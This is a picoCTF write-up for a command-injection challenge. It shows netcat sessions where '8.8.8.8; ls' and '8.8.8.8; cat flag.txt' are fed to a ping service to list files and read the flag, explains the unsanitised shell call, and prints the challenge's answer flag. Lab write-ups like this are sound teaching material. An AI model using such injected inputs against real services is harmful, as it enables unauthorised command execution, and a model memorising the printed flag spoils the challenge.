# Author: Yahaya Meddy

# Description
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here nc mxxxx-sea.picoctf.net 64057

# Hints
1. The program uses a shell command behind the scenes.
2. Sometimes, You can run more than one command at a time.

# Steps
1. Connect to the given remote server.
```
urielbyte-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 64057
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=10.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=10.9 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 10.805/10.839/10.873/0.034 ms
```

2. Seems like the input field or the script that is automatically run after the user connect to the server strictly force us to `ping 8.8.8.8`. I think then after we input the "8.8.8.8", we can append another command by using a semicolon (`;`), which acts as a command separator in Linux. `8.8.8.8; ls`
```
urielbyte-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 64057 
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=10.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=10.8 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 10.791/10.799/10.808/0.008 ms
flag.txt
script.sh
```

3. After identified the files that are on the landing directory, we can read the content with cat command.
```
urielbyte-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 64057 
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=10.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=10.8 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 10.819/10.822/10.825/0.003 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}
```

# Explanation
The vulnerability in this challenge is called **OS Command Injection.**

When we connect to the server, a backend script is taking our input and passing it directly to the underlying operating system's shell to execute a ping command. The backend code likely looks something like this:
`ping -c 2 <USER_INPUT>`

The flaw is that the application does not properly `"sanitize"` or filter our input. In Linux, certain special characters act as command separators—most notably the semicolon (;). The semicolon tells the terminal to finish executing the first command and then immediately run the next one.

When we input `8.8.8.8; ls`, the server blindly constructs and runs this full command:
`ping -c 2 8.8.8.8; ls`

Because the server fails to strip out that semicolon, it successfully pings the IP address and then immediately executes our injected ls command, giving us a window into the server's file system and allowing us to read the flag.

Answer: picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}
